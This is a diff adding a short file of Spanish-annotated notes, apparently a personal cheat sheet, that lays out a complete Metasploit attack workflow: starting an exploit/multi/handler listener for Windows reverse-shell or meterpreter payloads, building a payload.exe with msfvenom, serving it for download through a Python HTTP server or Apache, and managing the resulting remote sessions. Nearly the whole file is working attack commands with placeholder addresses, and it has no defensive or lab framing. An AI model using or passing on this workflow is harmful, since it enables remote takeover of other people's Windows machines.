@@ -1,0 +1,29 @@
+msfconsole
+	use exploit/multi/handler
+	set payload windows/shell/reverse_tcp (windows/meterpreter/reverse_tcp)
+	show options
+	set lhost (#ip del local host)
+	set lport (#puerto del local host a asignar)
+	run -z -j (inicia lo anterior)
+
+netstat -tunlp (muestra que lo anterior se encuentra)
+
+msfvenom -p windows/shell/reverse_tcp(windows/meterpreter/reverse_tcp) LHOST=(#ip del host local) LPORT=(#puerto del host local a utilizar) -f exe > payload.exe
+
+python -m simpleHTTPServer (#Puerto para soportar el servicio web)
+
+mkdir /var/www/html/(nombre de carpeta)
+
+cp payload.exe /var/www/html/(nombre de carpeta)
+
+service apache2 start
+
+pagina = (#ip local):(#puerto local)
+
+
+sessions
+
+sessions (id sesion)
+
+control+z (salir de la sesion pero dejando las sesiones abiertas)
+
